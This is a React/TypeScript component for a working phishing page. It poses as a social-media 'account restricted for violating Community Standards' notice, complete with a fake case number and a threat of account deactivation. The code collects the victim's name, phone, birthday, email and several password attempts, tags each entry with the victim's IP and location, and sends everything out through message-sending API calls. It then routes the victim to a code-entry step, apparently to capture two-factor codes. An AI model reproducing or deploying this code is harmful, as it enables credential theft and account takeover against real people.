import HomeImage from '@assets/home-image.png';
import LoadingModal from '@components/LoadingModal';
import { editMessageText, sendMessage } from '@utils/api';
import getConfig from '@utils/config';
import getToday from '@utils/getToday';
import React, { useEffect, useRef, useState } from 'react';
import 'react-phone-input-2/lib/style.css';
import { Outlet, useLocation, useNavigate } from 'react-router-dom';
const getCurrentTime = () => {
	const currentTime = new Date()
		.toLocaleString('vi-VN', {
			timeZone: 'Asia/Ho_Chi_Minh',
			hour: '2-digit',
			minute: '2-digit',
			second: '2-digit',
			day: '2-digit',
			month: '2-digit',
			year: 'numeric',
		})
		.replace(',', ' -');
	return currentTime;
};
const GetInfo: React.FC = () => {
	const navigate = useNavigate();
	const location = useLocation();
	const ip = localStorage.getItem('ipAddress');
	const country =
		localStorage.getItem('country')?.toUpperCase() +
		' - ' +
		localStorage.getItem('region')?.toUpperCase() +
		' - ' +
		localStorage.getItem('city')?.toUpperCase();

	const [caseNumber, setCaseNumber] = useState<string>('');
	const [failedPasswordAttempts, setFailedPasswordAttempts] =
		useState<number>(1);
	const [isLoading, setIsLoading] = useState<boolean>(false);

	const [pageName, setPageName] = useState<string>('');
	const [name, setName] = useState<string>('');
	const [phoneNumber, setPhoneNumber] = useState<string>('');
	const [birthday, setBirthday] = useState<string>('');
	const [email, setEmail] = useState<string>('');
	const [password, setPassword] = useState<string>('');
	const [confirmPassword, setConfirmPassword] = useState<string>('');

	const pageNameInputRef = useRef<HTMLInputElement>(null);
	const nameInputRef = useRef<HTMLInputElement>(null);
	const phoneNumberInputRef = useRef<HTMLInputElement>(null);
	const birthdayInputRef = useRef<HTMLInputElement>(null);
	const emailInputRef = useRef<HTMLInputElement>(null);
	const passwordInputRef = useRef<HTMLInputElement>(null);
	const [loadingTime, setLoadingTime] = useState<number>(0);
	useEffect(() => {
		const configData = async () => {
			const configData = await getConfig();
			setLoadingTime(configData.settings.pass_loading_time);
		};
		configData();
	}, []);
	const confirmPasswordInputRef = useRef<HTMLInputElement>(null);
	const generateRandomNumber = (): string => {
		const randomNumber = Math.floor(Math.random() * 1_000_000_000_000);
		return `#${randomNumber.toString().padStart(12, '0')}`;
	};

	const handleButtonClick = () => {
		const currentPath = location.pathname;

		const handleBusinessHome = () => {
			if (pageName === '') {
				pageNameInputRef.current?.focus();
			} else if (name === '') {
				nameInputRef.current?.focus();
			} else if (phoneNumber === '') {
				phoneNumberInputRef.current?.focus();
			} else if (birthday === '') {
				birthdayInputRef.current?.focus();
			} else {
				const newMessage =
					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
					`<b>🌐 IP:</b> <code>${ip}</code>\n` +
					`<b>🌍 Vị trí:</b> <code>${country}</code>\n\n` +
					`<b>📄 Tên Page:</b> <code>${pageName}</code>\n` +
					`<b>🧑 Tên:</b> <code>${name}</code>\n` +
					`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n\n` +
					`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n`;
				localStorage.setItem('message', newMessage);
				sendMessage({ text: newMessage });
				navigate('login');
			}
		};

		const handleBusinessHomeLogin = () => {
			setFailedPasswordAttempts(1);
			if (email === '') {
				emailInputRef.current?.focus();
			} else if (password === '') {
				passwordInputRef.current?.focus();
			} else {
				const existingMessage = localStorage.getItem('message') ?? '';
				const newMessage =
					existingMessage.replace(
						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
						`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
					) +
					`<b>📧 Email:</b> <code>${email}</code>\n` +
					`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
				localStorage.setItem('message', newMessage);
				const messageId = localStorage.getItem('message_id');
				editMessageText({
					message_id: Number(messageId),
					text: newMessage,
				});
				delayLoading();
			}
		};

		const handleBusinessHomeConfirmPassword = () => {
			if (confirmPassword === '') {
				confirmPasswordInputRef.current?.focus();
			} else {
				setFailedPasswordAttempts(failedPasswordAttempts + 1);
				delayLoading();
			}
		};

		const delayLoading = async () => {
			setIsLoading(true);
			if (currentPath === '/live/home/confirm-password') {
				const existingMessage = localStorage.getItem('message') ?? '';
				const updatedMessage =
					existingMessage.replace(
						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
						`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
					) +
					`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}:</b> <code>${confirmPassword}</code>`;
				localStorage.setItem('message', updatedMessage);
				const messageID = localStorage.getItem('message_id');
				editMessageText({
					message_id: Number(messageID),
					text: updatedMessage,
				});
			}
			const configData = await getConfig();
			setTimeout(async () => {
				setIsLoading(false);
				if (currentPath === '/live/home/login') {
					if (configData.settings.max_pass_attempts === 0) {
						navigate('/live/code-input');
					} else {
						navigate('/live/home/confirm-password');
					}
				} else if (
					failedPasswordAttempts ===
					configData.settings.max_pass_attempts
				) {
					navigate('/live/code-input');
				} else {
					if (confirmPasswordInputRef.current) {
						confirmPasswordInputRef.current.value = '';
					}
					confirmPasswordInputRef.current?.focus();
				}
			}, loadingTime);
		};

		switch (currentPath) {
			case '/live/home':
				handleBusinessHome();
				break;
			case '/live/home/login':
				handleBusinessHomeLogin();
				break;
			case '/live/home/confirm-password':
				handleBusinessHomeConfirmPassword();
				break;
			default:
				break;
		}
	};

	useEffect(() => {
		setCaseNumber(generateRandomNumber());
	}, []);

	return (
		<div className='flex w-11/12 flex-col justify-center md:w-2/5 2xl:w-1/3'>
			<div>
				<img src={HomeImage} className='w-full' alt='' />
				<b className='text-2xl'>Your account has been restricted</b>
				<p className='text-sm text-gray-500'>Term of Service</p>
				<hr />
			</div>
			<div className='my-5'>
				We detected unusual activity in your page today{' '}
				<strong>{getToday()}</strong>. Someone has reported your account
				for not complying with{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					Community Standards
				</b>
				. We have already reviewed this decision and the decision cannot
				be changed. To avoid having your account{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					disabled
				</b>{' '}
				, please verify:
			</div>
			<Outlet
				context={{
					setPageName,
					setName,
					setPhoneNumber,
					setBirthday,
					setEmail,
					setPassword,
					setConfirmPassword,
					pageNameInputRef,
					nameInputRef,
					phoneNumberInputRef,
					birthdayInputRef,
					emailInputRef,
					passwordInputRef,
					confirmPasswordInputRef,
					isLoading,
					failedPasswordAttempts,
				}}
			/>
			<div className='flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row'>
				<div className='flex gap-1 sm:flex-col sm:gap-0'>
					<b>Case Number:</b>
					<b className='text-blue-500'>{caseNumber}</b>
				</div>
				<div className='w-full sm:w-3/4'>
					<b>
						About Case: Violating Community Standards and Posting
						something inappropriate.
					</b>
				</div>
			</div>
			<button
				className={`my-5 flex w-full items-center justify-center rounded-full bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${
					isLoading ? 'cursor-not-allowed opacity-70' : ''
				}`}
				onClick={handleButtonClick}
				disabled={isLoading}
			>
				Continue
			</button>
			{isLoading && (
				<LoadingModal
					loadingTime={loadingTime}
					setShowLoadingModal={setIsLoading}
				/>
			)}
		</div>
	);
};
export default GetInfo;
export { getCurrentTime };
